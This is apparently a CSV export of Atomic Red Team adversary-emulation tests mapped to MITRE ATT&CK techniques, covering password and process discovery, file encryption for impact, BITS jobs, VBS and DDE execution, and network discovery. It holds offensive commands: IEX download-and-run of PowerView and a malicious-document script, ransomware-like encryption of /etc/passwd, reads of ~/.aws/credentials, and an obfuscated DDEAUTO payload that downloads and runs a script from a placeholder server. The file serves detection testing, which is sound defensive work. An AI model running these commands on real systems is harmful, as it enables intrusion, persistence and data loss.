dependencies.0.prereq_command: if [ $(rpm -q --queryformat '%{VERSION}') -eq ""6"" ]; then exit /b 0; else exit /b 1; fi;

dependencies.0.get_prereq_command: echo Please run from CentOS or RHEL v6

",
T1201,Password Policy Discovery,Examine password expiration policy - All Linux,7c86c55c-70fa-4a05-83c9-3aa19b145d1a,"Lists the password expiration policy to console on CentOS/RHEL/Ubuntu.
",linux,,,"cat /etc/login.defs
",bash,,,,,,
T1201,Password Policy Discovery,Examine local password policy - Windows,4588d243-f24e-4549-b2e3-e627acc089f6,"Lists the local password policy to console on Windows.
",windows,,,"net accounts
",command_prompt,,,,,,
T1201,Password Policy Discovery,Examine domain password policy - Windows,46c2c362-2679-4ef5-aec9-0e958e135be4,"Lists the domain password policy to console on Windows.
",windows,,,"net accounts /domain
",command_prompt,,,,,,
T1201,Password Policy Discovery,Examine password policy - macOS,4b7fa042-9482-45e1-b348-4b756b2a0742,"Lists the password policy to console on macOS.
",macos,,,pwpolicy getaccountpolicies,bash,,,,,,
T1201,Password Policy Discovery,Get-DomainPolicy with PowerView,3177f4da-3d4b-4592-8bdc-aa23d0b2e843,"Utilizing PowerView, run Get-DomainPolicy to return the default domain policy or the domain controller policy for the current domain or a specified domain/domain controller.
",windows,,,"[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1' -UseBasicParsing); Get-DomainPolicy -verbose
",powershell,,,,,,
T1201,Password Policy Discovery,Enumerate Active Directory Password Policy with get-addefaultdomainpasswordpolicy,b2698b33-984c-4a1c-93bb-e4ba72a0babb,"The following Atomic test will utilize get-addefaultdomainpasswordpolicy to enumerate domain password policy.
Upon successful execution a listing of the policy implemented will display.
Reference: https://docs.microsoft.com/en-us/powershell/module/activedirectory/get-addefaultdomainpasswordpolicy?view=windowsserver2022-ps
",windows,,,"get-addefaultdomainpasswordpolicy
",powershell,False,,,,,
T1201,Password Policy Discovery,Use of SecEdit.exe to export the local security policy (including the password policy),510cc97f-56ac-4cd3-a198-d3218c23d889,"SecEdit.exe can be used to export the current local security policy applied to a host.
[Reference](https://blueteamops.medium.com/secedit-and-i-know-it-595056dee53d)
",windows,,,"secedit.exe /export /areas SECURITYPOLICY /cfg output_mysecpol.txt
",command_prompt,True,,,,,
T1201,Password Policy Discovery,Examine AWS Password Policy,15330820-d405-450b-bd08-16b5be5be9f4,"This atomic test will display details about the password policy for the current AWS account.
",iaas:aws,,,"aws iam get-account-password-policy
",sh,False,,,,"dependencies.0.description: Check if ~/.aws/credentials file has a default stanza is configured

dependencies.0.prereq_command: cat ~/.aws/credentials | grep ""default""

dependencies.0.get_prereq_command: echo Please install the aws-cli and configure your AWS defult profile using: aws configure

",
T1037.005,Boot or Logon Initialization Scripts: Startup Items,Add file to Local Library StartupItems,134627c3-75db-410e-bff8-7a920075f198,"Modify or create an file in /Library/StartupItems

[Reference](https://www.alienvault.com/blogs/labs-research/diversity-in-recent-mac-malware)
",macos,,,"sudo touch /Library/StartupItems/EvilStartup.plist
",sh,True,,"sudo rm /Library/StartupItems/EvilStartup.plist
",,,
T1057,Process Discovery,Process Discovery - ps,4ff64f0b-aaf2-4866-b39d-38d9791407cc,"Utilize ps to identify processes.

Upon successful execution, sh will execute ps and output to /tmp/loot.txt.
",linux,macos,,"ps >> #{output_file}
ps aux >> #{output_file}
",sh,,,"rm #{output_file}
",,,"input_arguments.output_file.description: path of output file

input_arguments.output_file.type: path

input_arguments.output_file.default: /tmp/loot.txt

"
T1057,Process Discovery,Process Discovery - tasklist,c5806a4f-62b8-4900-980b-c7ec004e9908,"Utilize tasklist to identify processes.

Upon successful execution, cmd.exe will execute tasklist.exe to list processes. Output will be via stdout. 
",windows,,,"tasklist
",command_prompt,,,,,,
T1057,Process Discovery,Process Discovery - Get-Process,3b3809b6-a54b-4f5b-8aff-cb51f2e97b34,"Utilize Get-Process PowerShell cmdlet to identify processes.

Upon successful execution, powershell.exe will execute Get-Process to list processes. Output will be via stdout. 
",windows,,,"Get-Process
",powershell,,,,,,
T1057,Process Discovery,Process Discovery - get-wmiObject,b51239b4-0129-474f-a2b4-70f855b9f2c2,"Utilize get-wmiObject PowerShell cmdlet to identify processes.

Upon successful execution, powershell.exe will execute get-wmiObject to list processes. Output will be via stdout. 
",windows,,,"get-wmiObject -class Win32_Process
",powershell,,,,,,
T1057,Process Discovery,Process Discovery - wmic process,640cbf6d-659b-498b-ba53-f6dd1a1cc02c,"Utilize windows management instrumentation to identify processes.

Upon successful execution, WMIC will execute process to list processes. Output will be via stdout. 
",windows,,,"wmic process get /format:list
",command_prompt,,,,,,
T1057,Process Discovery,Discover Specific Process - tasklist,11ba69ee-902e-4a0f-b3b6-418aed7d7ddb,"Adversaries may use command line tools to discover specific processes in preparation of further attacks. 
Examples of this could be discovering the PID of lsass.exe to dump its memory or discovering whether specific security processes (e.g. AV or EDR) are running.
",windows,,,"tasklist | findstr #{process_to_enumerate}
",command_prompt,,,,,,"input_arguments.process_to_enumerate.description: Process name string to search for.

input_arguments.process_to_enumerate.type: string

input_arguments.process_to_enumerate.default: lsass

"
T1486,Data Encrypted for Impact,Encrypt files using gpg (FreeBSD/Linux),7b8ce084-3922-4618-8d22-95f996173765,"Uses gpg to encrypt a file
",linux,,,"echo ""#{pwd_for_encrypted_file}"" | $which_gpg --batch --yes --passphrase-fd 0 --cipher-algo #{encryption_alg} -o #{encrypted_file_path} -c #{input_file_path}
",sh,False,,"rm #{encrypted_file_path}
",bash,"dependencies.0.description: Finds where gpg is located

dependencies.0.prereq_command: which_gpg=`which gpg`

dependencies.0.get_prereq_command: (which pkg && pkg install -y gnupg)||(which yum && yum -y install epel-release gpg)||(which apt-get && DEBIAN_FRONTEND=noninteractive apt-get install -y gpg)

","input_arguments.pwd_for_encrypted_file.description: the password that you want for the encrypted file

input_arguments.pwd_for_encrypted_file.type: string

input_arguments.pwd_for_encrypted_file.default: passwd

input_arguments.encrypted_file_path.description: path to the encrypted file

input_arguments.encrypted_file_path.type: path

input_arguments.encrypted_file_path.default: /tmp/passwd.gpg

input_arguments.input_file_path.description: path to the file that you want to encrypt

input_arguments.input_file_path.type: path

input_arguments.input_file_path.default: /etc/passwd

input_arguments.encryption_alg.description: encryption algorithm of the file

input_arguments.encryption_alg.type: string

input_arguments.encryption_alg.default: AES-256

"
T1486,Data Encrypted for Impact,Encrypt files using 7z (FreeBSD/Linux),53e6735a-4727-44cc-b35b-237682a151ad,"Uses 7z to encrypt a file
",linux,,,"$which_7z a -p#{pwd_for_encrypted_file} #{encrypted_file_path} #{input_file_path}
",sh,False,,"$which_7z e #{encrypted_file_path}
rm #{encrypted_file_path}
",bash,"dependencies.0.description: Finds where 7z is located

dependencies.0.prereq_command: which_7z=`which 7z`

dependencies.0.get_prereq_command: (which pkg && pkg install -y 7-zip)

","input_arguments.pwd_for_encrypted_file.description: the password that you want for the encrypted file

input_arguments.pwd_for_encrypted_file.type: string

input_arguments.pwd_for_encrypted_file.default: passwd

input_arguments.encrypted_file_path.description: path to the encrypted file

input_arguments.encrypted_file_path.type: path

input_arguments.encrypted_file_path.default: /tmp/passwd.zip

input_arguments.input_file_path.description: path to the file that you want to encrypt

input_arguments.input_file_path.type: path

input_arguments.input_file_path.default: /etc/passwd

"
T1486,Data Encrypted for Impact,Encrypt files using ccrypt (FreeBSD/Linux),08cbf59f-85da-4369-a5f4-049cffd7709f,"Attempts to encrypt data on target systems as root to simulate an inturruption authentication to target system. If root permissions are not available then attempts to encrypt data within user's home directory.
",linux,,,"if [ $USER == ""root"" ]; then $which_ccencrypt #{root_input_file_path}; file #{root_input_file_path}.cpt; #{impact_command}; else $which_ccencrypt #{user_input_file_path}; file #{user_input_file_path}.cpt; #{impact_command}; fi
",sh,False,,"if [ $USER == ""root"" ]; then mv #{cped_file_path} #{root_input_file_path}; else cp #{cped_file_path} #{user_input_file_path}; fi 
",sh,"dependencies.0.description: Finds where ccencrypt and ccdecrypt is located and copies input file

dependencies.0.prereq_command: which_ccencrypt=`which ccencrypt`
which_ccdecrypt=`which ccdecrypt`
if [ $USER == ""root"" ]; then cp #{root_input_file_path} #{cped_file_path}; else cp #{user_input_file_path} #{cped_file_path}; fi

dependencies.0.get_prereq_command: (which pkg && pkg install -y ccript)||(which yum && yum -y install epel-release ccrypt)||(which apt-get && DEBIAN_FRONTEND=noninteractive apt-get install -y ccrypt)

","input_arguments.cped_file_path.description: path where you want your copied file to be

input_arguments.cped_file_path.type: path

input_arguments.cped_file_path.default: /tmp/passwd

input_arguments.root_input_file_path.description: path to the file that you want to be encrypted if you are root user

input_arguments.root_input_file_path.type: path

input_arguments.root_input_file_path.default: /etc/passwd

input_arguments.user_input_file_path.description: path to file that you want to be encrypted if you are normal user

input_arguments.user_input_file_path.type: path

input_arguments.user_input_file_path.default: ~/.bash_history

input_arguments.impact_command.description: command to show impact of encryption

input_arguments.impact_command.type: string

input_arguments.impact_command.default: sudo su

"
T1486,Data Encrypted for Impact,Encrypt files using openssl (FreeBSD/Linux),142752dc-ca71-443b-9359-cf6f497315f1,"Uses openssl to encrypt a file
",linux,,,"$which_openssl genrsa -out #{private_key_path} #{encryption_bit_size}
$which_openssl rsa -in #{private_key_path} -pubout -out #{public_key_path}
$which_openssl rsautl -encrypt -inkey #{public_key_path} -pubin -in #{input_file_path} -out #{encrypted_file_path}
",sh,False,,"$which_openssl rsautl -decrypt -inkey #{private_key_path} -in #{encrypted_file_path}
rm #{encrypted_file_path}
",bash,"dependencies.0.description: Finds where openssl is located

dependencies.0.prereq_command: which_openssl=`which openssl`

dependencies.0.get_prereq_command: 
","input_arguments.private_key_path.description: path to the private key

input_arguments.private_key_path.type: path

input_arguments.private_key_path.default: /tmp/key.pem

input_arguments.public_key_path.description: path to the public key

input_arguments.public_key_path.type: path

input_arguments.public_key_path.default: /tmp/pub.pem

input_arguments.encryption_bit_size.description: size of the bit of encryption

input_arguments.encryption_bit_size.type: integer

input_arguments.encryption_bit_size.default: 2048

input_arguments.encrypted_file_path.description: path to the encrypted file

input_arguments.encrypted_file_path.type: path

input_arguments.encrypted_file_path.default: /tmp/passwd.zip

input_arguments.input_file_path.description: path to the file that you want to encrypt

input_arguments.input_file_path.type: path

input_arguments.input_file_path.default: /etc/passwd

"
T1486,Data Encrypted for Impact,PureLocker Ransom Note,649349c7-9abf-493b-a7a2-b1aa4d141528,"building the IOC (YOUR_FILES.txt) for the PureLocker ransomware 
https://www.bleepingcomputer.com/news/security/purelocker-ransomware-can-lock-files-on-windows-linux-and-macos/
",windows,,,"echo T1486 - Purelocker Ransom Note > %USERPROFILE%\Desktop\YOUR_FILES.txt
",command_prompt,True,,"del %USERPROFILE%\Desktop\YOUR_FILES.txt >nul 2>&1
",,,
T1486,Data Encrypted for Impact,Encrypt files using 7z utility - macOS,645f0f5a-ef09-48d8-b9bc-f0e24c642d72,"This test encrypts the file(s) using the 7z utility
",macos,,,"7z a -p #{file_password} -mhe=on #{encrypted_file_name} #{input_file_path}
",sh,False,,"rm #{encrypted_file_name}
",sh,"dependencies.0.description: Check if 7z command exists on the machine

dependencies.0.prereq_command: which 7z

dependencies.0.get_prereq_command: echo Installing 7z, using brew
/bin/bash -c ""$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)""
brew install p7zip

","input_arguments.file_password.description: Password to be provided for archiving the file

input_arguments.file_password.type: string

input_arguments.file_password.default: ARTPass

input_arguments.encrypted_file_name.description: Name of the archive to be created

input_arguments.encrypted_file_name.type: string

input_arguments.encrypted_file_name.default: ARTArchive.7z

input_arguments.input_file_path.description: Path to the file that you want to encrypt

input_arguments.input_file_path.type: path

input_arguments.input_file_path.default: ~/test.txt

"
T1486,Data Encrypted for Impact,Encrypt files using openssl utility - macOS,1a01f6b8-b1e8-418e-bbe3-78a6f822759e,"This test encrypts the file(s) using the openssl utility
",macos,,,"openssl enc #{encryption_option} -in #{input_file_path} -out #{output_file_name}
",sh,False,,"rm #{output_file_name}
",,,"input_arguments.encryption_option.description: Specifiy the required encryption option

input_arguments.encryption_option.type: string

input_arguments.encryption_option.default: -pbkdf2

input_arguments.input_file_path.description: Path to the file that you want to encrypt

input_arguments.input_file_path.type: path

input_arguments.input_file_path.default: ~/test.txt

input_arguments.output_file_name.description: Path to the file that you want to encrypt

input_arguments.output_file_name.type: string

input_arguments.output_file_name.default: ARTFile

"
T1486,Data Encrypted for Impact,Data Encrypted with GPG4Win,4541e2c2-33c8-44b1-be79-9161440f1718,Gpg4win is a Windows tool (also called Kleopatra which is the preferred certificate manager) that uses email and file encryption packages for symmetric encryption. It is used by attackers to encrypt disks. User will need to add pass phrase to encrypt file as automation is not allowed under newer versions.,windows,,,"cmd /c '#{GPG_Exe_Location}' -c '#{File_to_Encrypt_Location}'
",powershell,False,,"remove-item '#{File_to_Encrypt_Location}.gpg' -force -erroraction silentlycontinue | out-null
",,"dependencies.0.description: GPG must exist at (#{GPG_Exe_Location})

dependencies.0.prereq_command: if (test-path '#{GPG_Exe_Location}'){exit 0} else {exit 1}

dependencies.0.get_prereq_command: New-Item -Type Directory ""PathToAtomicsFolder\..\ExternalPayloads\"" -ErrorAction Ignore -Force | Out-Null
invoke-webrequest ""https://files.gpg4win.org/gpg4win-4.1.0.exe"" -outfile ""PathToAtomicsFolder\..\ExternalPayloads\gpginstall.exe""
cmd /c ""PathToAtomicsFolder\..\ExternalPayloads\gpginstall.exe"" /S

","input_arguments.GPG_Exe_Location.description: Path of the GPG program

input_arguments.GPG_Exe_Location.type: path

input_arguments.GPG_Exe_Location.default: C:\Program Files (x86)\GnuPG\bin\gpg.exe

input_arguments.File_to_Encrypt_Location.description: Path of File

input_arguments.File_to_Encrypt_Location.type: path

input_arguments.File_to_Encrypt_Location.default: $env:temp\test.txt

"
T1486,Data Encrypted for Impact,Data Encrypt Using DiskCryptor,44b68e11-9da2-4d45-a0d9-893dabd60f30,"DiskCryptor, an open source encryption utility, can be exploited by adversaries for encrypting all disk partitions, including system partitions. This tool was identified in a ransomware campaign, as reported on https://thedfirreport.com/2021/11/15/exchange-exploit-leads-to-domain-wide-ransomware/. The documentation for DiskCryptor can be found at https://github.com/DavidXanatos/DiskCryptor. During the installation process, running dcrypt.exe starts the encryption console. It's important to note that a system reboot is necessary as part of the installation.
",windows,,,"""""%PROGRAMFILES%\dcrypt""\#{dcrypt_exe}""
",command_prompt,True,,,powershell,"dependencies.0.description: dcrypt_setup will be installed at specified location (#{dcrypt_exe})

dependencies.0.prereq_command: if (Test-Path ""${env:ProgramFiles}/dcrypt/#{dcrypt_exe}"") {exit 0} else {exit 1}

dependencies.0.get_prereq_command: Write-Host Downloading DiskCryptor installer
New-Item -Type Directory ""PathToAtomicsFolder\..\ExternalPayloads\"" -ErrorAction Ignore -Force | Out-Null
Invoke-WebRequest ""https://github.com/DavidXanatos/DiskCryptor/releases/download/1.1.846.118/dcrypt_setup_1.1.846.118.exe"" -OutFile      ""PathToAtomicsFolder\..\ExternalPayloads\dcrypt_setup_1.1.846.118.exe""
Write-Host Install DiskCryptor
Start-Process ""PathToAtomicsFolder\..\ExternalPayloads\dcrypt_setup_1.1.846.118.exe"" -Wait -ArgumentList ""/s""

","input_arguments.dcrypt_exe.description: The dcrypt.exe executable from dcrypt_setup.exe

input_arguments.dcrypt_exe.type: path

input_arguments.dcrypt_exe.default: dcrypt.exe

"
T1580,Cloud Infrastructure Discovery,AWS - EC2 Enumeration from Cloud Instance,99ee161b-dcb1-4276-8ecb-7cfdcb207820,"This atomic runs several API calls (sts:GetCallerIdentity, s3:ListBuckets, iam:GetAccountSummary, iam:ListRoles, iam:ListUsers, iam:GetAccountAuthorizationDetails, ec2:DescribeSnapshots, cloudtrail:DescribeTrails, guardduty:ListDetectors) from the context of an EC2 instance role. This simulates an attacker compromising an EC2 instance and running initial discovery commands on it. This atomic test leverages a tool called stratus-red-team built by DataDog (https://github.com/DataDog/stratus-red-team). Stratus Red Team is a self-contained binary. You can use it to easily detonate offensive attack techniques against a live cloud environment. Ref: https://stratus-red-team.cloud/attack-techniques/AWS/aws.discovery.ec2-enumerate-from-instance/
",linux,macos,iaas:aws,"export AWS_REGION=#{aws_region}
cd #{stratus_path}
echo ""Stratus: Start Warmup.""
./stratus warmup aws.discovery.ec2-enumerate-from-instance
echo ""Stratus: Start Detonate.""
./stratus detonate aws.discovery.ec2-enumerate-from-instance
",sh,False,,"cd #{stratus_path}
echo ""Stratus: Start Cleanup.""
./stratus cleanup aws.discovery.ec2-enumerate-from-instance
echo ""Removing Stratus artifacts from local machine.""
rm -rf stratus*
",sh,"dependencies.0.description: Stratus binary must be present at the (#{stratus_path}/stratus)

dependencies.0.prereq_command: if test -f ""#{stratus_path}/stratus""; then exit 0; else exit 1; fi

dependencies.0.get_prereq_command: if [ ""$(uname)"" = ""Darwin"" ]
then DOWNLOAD_URL=$(curl -s https://api.github.com/repos/DataDog/stratus-red-team/releases/latest | grep browser_download_url | grep -i Darwin_x86_64 | cut -d '""' -f 4); wget -q -O #{stratus_path}/stratus-red-team-latest.tar.gz $DOWNLOAD_URL
  tar -xzvf #{stratus_path}/stratus-red-team-latest.tar.gz --directory #{stratus_path}/
elif [ ""$(expr substr $(uname) 1 5)"" = ""Linux"" ]
then DOWNLOAD_URL=$(curl -s https://api.github.com/repos/DataDog/stratus-red-team/releases/latest | grep browser_download_url | grep -i linux_x86_64 | cut -d '""' -f 4); wget -q -O #{stratus_path}/stratus-red-team-latest.tar.gz $DOWNLOAD_URL
  tar -xzvf #{stratus_path}/stratus-red-team-latest.tar.gz --directory #{stratus_path}/
fi 

dependencies.1.description: Check if ~/.aws/credentials file has a default stanza is configured

dependencies.1.prereq_command: cat ~/.aws/credentials | grep ""default""

dependencies.1.get_prereq_command: echo ""Please install the aws-cli and configure your AWS default profile using: aws configure""

","input_arguments.stratus_path.description: Path of stratus binary

input_arguments.stratus_path.type: path

input_arguments.stratus_path.default: $PathToAtomicsFolder/T1580/src

input_arguments.aws_region.description: AWS region to detonate

input_arguments.aws_region.type: string

input_arguments.aws_region.default: us-west-2

"
T1059.005,Command and Scripting Interpreter: Visual Basic,Visual Basic script execution to gather local computer information,1620de42-160a-4fe5-bbaf-d3fef0181ce9,"Visual Basic execution test, execute vbscript via PowerShell.

When successful, system information will be written to $env:TEMP\T1059.005.out.txt.",windows,,,"cscript ""#{vbscript}"" > $env:TEMP\T1059.005.out.txt
",powershell,,,Remove-Item $env:TEMP\T1059.005.out.txt -ErrorAction Ignore,powershell,"dependencies.0.description: Sample script must exist on disk at specified location (#{vbscript})
dependencies.0.prereq_command: if (Test-Path ""#{vbscript}"") {exit 0} else {exit 1}

dependencies.0.get_prereq_command: New-Item -ItemType Directory (Split-Path ""#{vbscript}"") -Force | Out-Null
Invoke-WebRequest ""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.005/src/sys_info.vbs"" -OutFile ""#{vbscript}""
","input_arguments.vbscript.description: Path to sample script

input_arguments.vbscript.type: string

input_arguments.vbscript.default: PathToAtomicsFolder\T1059.005\src\sys_info.vbs

"
T1059.005,Command and Scripting Interpreter: Visual Basic,Encoded VBS code execution,e8209d5f-e42d-45e6-9c2f-633ac4f1eefa,"This module takes an encoded VBS script and executes it from within a malicious document. By default, upon successful execution
a message box will pop up displaying ""ART T1059.005""

A note regarding this module, due to the way that this module utilizes ""ScriptControl"" a 64bit version of Microsoft Office is required.
You can validate this by opening WinWord -> File -> Account -> About Word
",windows,,,"[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (iwr ""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1"" -UseBasicParsing)
Invoke-Maldoc -macroFile ""PathToAtomicsFolder\T1059.005\src\T1059.005-macrocode.txt"" -officeProduct ""Word"" -sub ""Exec""
",powershell,,,"Get-WmiObject win32_process | Where-Object {$_.CommandLine -like ""*mshta*""}  | % { ""$(Stop-Process $_.ProcessID)"" } | Out-Null
",powershell,"dependencies.0.description: The 64-bit version of Microsoft Office must be installed

dependencies.0.prereq_command: try {
  $wdApp = New-Object -COMObject ""Word.Application""
  $path = $wdApp.Path
  Stop-Process -Name ""winword""
  if ($path.contains(""(x86)"")) { exit 1 } else { exit 0 }
} catch { exit 1 }

dependencies.0.get_prereq_command: Write-Host ""You will need to install Microsoft Word (64-bit) manually to meet this requirement""

",
T1059.005,Command and Scripting Interpreter: Visual Basic,Extract Memory via VBA,8faff437-a114-4547-9a60-749652a03df6,"This module attempts to emulate malware authors utilizing well known techniques to extract data from memory/binary files. To do this
we first create a string in memory then pull out the pointer to that string. Finally, it uses this pointer to copy the contents of that
memory location to a file stored in the $env:TEMP\atomic_t1059_005_test_output.bin.
",windows,,,"[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (iwr ""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1"" -UseBasicParsing) 
Invoke-Maldoc -macroFile ""PathToAtomicsFolder\T1059.005\src\T1059_005-macrocode.txt"" -officeProduct ""Word"" -sub ""Extract""
",powershell,,,"Remove-Item ""$env:TEMP\atomic_t1059_005_test_output.bin"" -ErrorAction Ignore
",powershell,"dependencies.0.description: Microsoft #{ms_product} must be installed

dependencies.0.prereq_command: try {
  New-Object -COMObject ""#{ms_product}.Application"" | Out-Null
  $process = ""#{ms_product}""; if ( $process -eq ""Word"") {$process = ""winword""}
  Stop-Process -Name $process
  exit 0
} catch { exit 1 }

dependencies.0.get_prereq_command: Write-Host ""You will need to install Microsoft #{ms_product} manually to meet this requirement""

","input_arguments.ms_product.description: Maldoc application Word

input_arguments.ms_product.type: string

input_arguments.ms_product.default: Word

"
T1197,BITS Jobs,Bitsadmin Download (cmd),3c73d728-75fb-4180-a12f-6712864d7421,"This test simulates an adversary leveraging bitsadmin.exe to download
and execute a payload
",windows,,,"bitsadmin.exe /transfer /Download /priority Foreground #{remote_file} #{local_file}
",command_prompt,,,"del #{local_file} >nul 2>&1
",,,"input_arguments.remote_file.description: Remote file to download

input_arguments.remote_file.type: url

input_arguments.remote_file.default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md

input_arguments.local_file.description: Local file path to save downloaded file

input_arguments.local_file.type: path

input_arguments.local_file.default: %temp%\bitsadmin1_flag.ps1

"
T1197,BITS Jobs,Bitsadmin Download (PowerShell),f63b8bc4-07e5-4112-acba-56f646f3f0bc,"This test simulates an adversary leveraging bitsadmin.exe to download
and execute a payload leveraging PowerShell

Upon execution you will find a github markdown file downloaded to the Temp directory
",windows,,,"Start-BitsTransfer -Priority foreground -Source #{remote_file} -Destination #{local_file}
",powershell,,,"Remove-Item #{local_file} -ErrorAction Ignore
",,,"input_arguments.remote_file.description: Remote file to download

input_arguments.remote_file.type: url

input_arguments.remote_file.default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md

input_arguments.local_file.description: Local file path to save downloaded file

input_arguments.local_file.type: path

input_arguments.local_file.default: $env:TEMP\bitsadmin2_flag.ps1

"
T1197,BITS Jobs,"Persist, Download, & Execute",62a06ec5-5754-47d2-bcfc-123d8314c6ae,"This test simulates an adversary leveraging bitsadmin.exe to schedule a BITS transferand execute a payload in multiple steps.
Note that in this test, the file executed is not the one downloaded. The downloading of a random file is simply the trigger for getting bitsdamin to run an executable.
This has the interesting side effect of causing the executable (e.g. notepad) to run with an Initiating Process of ""svchost.exe"" and an Initiating Process Command Line of ""svchost.exe -k netsvcs -p -s BITS""
This job will remain in the BITS queue until complete or for up to 90 days by default if not removed.
",windows,,,"bitsadmin.exe /create #{bits_job_name}
bitsadmin.exe /addfile #{bits_job_name} #{remote_file} #{local_file}
bitsadmin.exe /setnotifycmdline #{bits_job_name} #{command_path} NULL
bitsadmin.exe /resume #{bits_job_name}
ping -n 5 127.0.0.1 >nul 2>&1
bitsadmin.exe /complete #{bits_job_name}
",command_prompt,,,"del #{local_file} >nul 2>&1
",,,"input_arguments.command_path.description: Path of command to execute

input_arguments.command_path.type: path

input_arguments.command_path.default: C:\Windows\system32\notepad.exe

input_arguments.bits_job_name.description: Name of BITS job

input_arguments.bits_job_name.type: string

input_arguments.bits_job_name.default: AtomicBITS

input_arguments.local_file.description: Local file path to save downloaded file

input_arguments.local_file.type: path

input_arguments.local_file.default: %temp%\bitsadmin3_flag.ps1

input_arguments.remote_file.description: Remote file to download

input_arguments.remote_file.type: url

input_arguments.remote_file.default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md

"
T1197,BITS Jobs,Bits download using desktopimgdownldr.exe (cmd),afb5e09e-e385-4dee-9a94-6ee60979d114,"This test simulates using desktopimgdownldr.exe to download a malicious file
instead of a desktop or lockscreen background img. The process that actually makes 
the TCP connection and creates the file on the disk is a svchost process (“-k netsvc -p -s BITS”) 
and not desktopimgdownldr.exe. See https://labs.sentinelone.com/living-off-windows-land-a-new-native-file-downldr/
",windows,,,"set ""#{download_path}"" && cmd /c desktopimgdownldr.exe /lockscreenurl:#{remote_file} /eventName:desktopimgdownldr
",command_prompt,,,"del #{cleanup_path}\#{cleanup_file} >nul 2>&1
",,,"input_arguments.remote_file.description: Remote file to download

input_arguments.remote_file.type: url

input_arguments.remote_file.default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md

input_arguments.download_path.description: Local file path to save downloaded file

input_arguments.download_path.type: path

input_arguments.download_path.default: SYSTEMROOT=C:\Windows\Temp

input_arguments.cleanup_path.description: path to delete file as part of cleanup_command

input_arguments.cleanup_path.type: path

input_arguments.cleanup_path.default: C:\Windows\Temp\Personalization\LockScreenImage

input_arguments.cleanup_file.description: file to remove as part of cleanup_command

input_arguments.cleanup_file.type: string

input_arguments.cleanup_file.default: *.md

"
T1559.002,Inter-Process Communication: Dynamic Data Exchange,Execute Commands,f592ba2a-e9e8-4d62-a459-ef63abd819fd,"Executes commands via DDE using Microsfot Word
",windows,,,,manual,,"Open Microsoft Word

Insert tab -> Quick Parts -> Field

Choose = (Formula) and click ok.

After that, you should see a Field inserted in the document with an error ""!Unexpected End of Formula"", right-click the Field, and choose Toggle Field Codes.

The Field Code should now be displayed, change it to Contain the following:

{DDEAUTO c:\\windows\\system32\\cmd.exe ""/k calc.exe""  }
",,,,
T1559.002,Inter-Process Communication: Dynamic Data Exchange,Execute PowerShell script via Word DDE,47c21fb6-085e-4b0d-b4d2-26d72c3830b3,"When the word document opens it will prompt the user to click ok on a dialogue box, then attempt to run PowerShell with DDEAUTO to download and execute a powershell script
",windows,,,"start ""$PathToAtomicsFolder\T1559.002\bin\DDE_Document.docx""
",command_prompt,,,,,,
T1559.002,Inter-Process Communication: Dynamic Data Exchange,DDEAUTO,cf91174c-4e74-414e-bec0-8d60a104d181,"
TrustedSec - Unicorn - https://github.com/trustedsec/unicorn

SensePost DDEAUTO - https://sensepost.com/blog/2017/macro-less-code-exec-in-msword/

Word VBA Macro

[Dragon's Tail](https://github.com/redcanaryco/atomic-red-team/tree/master/ARTifacts/Adversary/Dragons_Tail)
",windows,,,,manual,,"1. Open Word

2. Insert tab -> Quick Parts -> Field

3. Choose = (Formula) and click ok.

4. Once the field is inserted, you should now see ""!Unexpected End of Formula""

5. Right-click the Field, choose ""Toggle Field Codes""

6. Paste in the code from Unicorn or SensePost

7. Save the Word document.

9. DDEAUTO c:\\windows\\system32\\cmd.exe ""/k calc.exe""

10. DDEAUTO ""C:\\Programs\\Microsoft\\Office\\MSWord\\..\\..\\..\\..\\windows\\system32\\{ QUOTE 87 105 110 100 111 119 115 80 111 119 101 114 83 104 101 108 108 }\\v1.0\\{ QUOTE 112 111 119 101 114 115 104 101 108 108 46 101 120 101 } -w 1 -nop { QUOTE 105 101 120 }(New-Object System.Net.WebClient).DownloadString('http://<server>/download.ps1'); # "" ""Microsoft Document Security Add-On""
",,,,
T1016,System Network Configuration Discovery,System Network Configuration Discovery on Windows,970ab6a1-0157-4f3f-9a73-ec4166754b23,"Identify network configuration information

Upon successful execution, cmd.exe will spawn multiple commands to list network configuration settings. Output will be via stdout.
",windows,,,"ipconfig /all
netsh interface show interface
arp -a
nbtstat -n
net config
",command_prompt,,,,,,
T1016,System Network Configuration Discovery,List Windows Firewall Rules,038263cb-00f4-4b0a-98ae-0696c67e1752,"Enumerates Windows Firewall Rules using netsh.

Upon successful execution, cmd.exe will spawn netsh.exe to list firewall rules. Output will be via stdout.
",windows,,,"netsh advfirewall firewall show rule name=all
",command_prompt,,,,,,
T1016,System Network Configuration Discovery,System Network Configuration Discovery,c141bbdb-7fca-4254-9fd6-f47e79447e17,"Identify network configuration information.
Upon successful execution, sh will spawn multiple commands and output will be via stdout.
",macos,linux,,"if [ ""$(uname)"" = 'FreeBSD' ]; then cmd=""netstat -Sp tcp""; else cmd=""netstat -ant""; fi;
if [ -x ""$(command -v arp)"" ]; then arp -a; else echo ""arp is missing from the machine. skipping...""; fi;
if [ -x ""$(command -v ifconfig)"" ]; then ifconfig; else echo ""ifconfig is missing from the machine. skipping...""; fi;
if [ -x ""$(command -v ip)"" ]; then ip addr; else echo ""ip is missing from the machine. skipping...""; fi;
if [ -x ""$(command -v netstat)"" ]; then $cmd | awk '{print $NF}' | grep -v '[[:lower:]]' | sort | uniq -c; else echo ""netstat is missing from the machine. skipping...""; fi;
",sh,,,,sh,"dependencies.0.description: Check if arp command exists on the machine

dependencies.0.prereq_command: if [ -x ""$(command -v arp)"" ]; then exit 0; else exit 1; fi;

